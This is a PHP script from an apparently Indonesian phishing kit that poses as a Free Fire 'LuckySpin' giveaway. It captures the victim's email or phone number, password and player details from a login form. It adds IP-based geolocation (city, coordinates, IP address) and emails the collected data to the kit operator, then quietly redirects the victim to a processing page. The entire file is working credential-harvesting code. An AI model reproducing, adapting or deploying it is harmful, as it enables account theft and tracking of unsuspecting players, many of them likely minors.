<?php
// MENGAMBIL KONTROL
include 'system/setting.php';
include 'system/geolocation.php';
include 'email.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$level = $_POST['level'];
$tier = $_POST['tier'];
$rpt = $_POST['rpt'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $playid == "" && $level == "" && $tier == "" && $rpt == "" && $login == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "AKUN EPEP SI [ $email ] | LEVEL $level | TIER $tier | LOGIN $login";
$pesan = '
<center> 
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>EMAIL/NOMOR TELEPON</th>
<th style="width:78%;text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>PASSWORD</th>
<th style="width:78%;text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>ID PLAYER</th>
<th style="width:78%;text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>LEVEL AKUN</th>
<th style="width:78%;text-align: center;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>TIER RANKED</th>
<th style="width:78%;text-align: center;"><b>'.$tier.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>ELITE PASS</th>
<th style="width:78%;text-align: center;"><b>'.$rpt.'</th> 
</tr>
<tr>
<th style="width:22%;text-align:left;" height="25px"><b>LOGIN</th>
<th style="width:78%;text-align:center;"><b>'.$login.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Tambahan</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>BENUA</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['continent'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['country'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['region'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['city'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['lat'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['lon'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['query'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<br>
</div>
<div style="float: center;">
Youtube : <a href="https://www.youtube.com/channel/UCwS6id2O2iNRo0yB908eJDQ"><b>RazorID YT</b></a>
</div>
</div>
</center>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: RazorID YT|LuckySpin|<razoridyt@hentai.com>' . "\r\n";
$kirim = mail($razoridyt, $subjek, $pesan, $headers);

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
if($kirim) {
echo "<form id='arpantek' method='POST' action='processing.php'>
<input type='hidden' name='email' value='$email'>
</form>
<script type='text/javascript'>document.getElementById('arpantek').submit();</script>";
}
}
?>
